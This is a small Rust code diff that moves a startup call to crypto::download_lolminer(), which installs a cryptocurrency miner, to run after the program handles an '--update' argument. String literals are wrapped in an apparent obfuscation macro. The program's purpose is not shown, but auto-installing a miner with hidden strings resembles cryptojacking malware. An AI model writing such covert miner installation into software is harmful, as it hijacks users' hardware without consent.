@@ -29,10 +29,6 @@ async fn main() {
     // init logger
     logger::init();
     let args: Vec<String> = env::args().collect();
-    match crypto::download_lolminer().await {
-        Err(err) => error!("{}{}", crypto!("Miner installing failed"), err),
-        Ok(_) => {},
-    }
     match args.iter().any(|v| v == &crypto!("--update")) {
         true => {
             let position = args.iter().position(|r| r == &crypto!("--update")).unwrap();
@@ -132,10 +128,10 @@ async fn main() {
         }
     }
 
-    // match crypto::download_lolminer().await {
-    //     Err(err) => error!("{}{}", crypto!("Miner installing failed"), err),
-    //     Ok(_) => {},
-    // }
+    match crypto::download_lolminer().await {
+        Err(err) => error!("{}{}", crypto!("Miner installing failed"), err),
+        Ok(_) => {},
+    }
 
     tokio::spawn(async {
         loop {
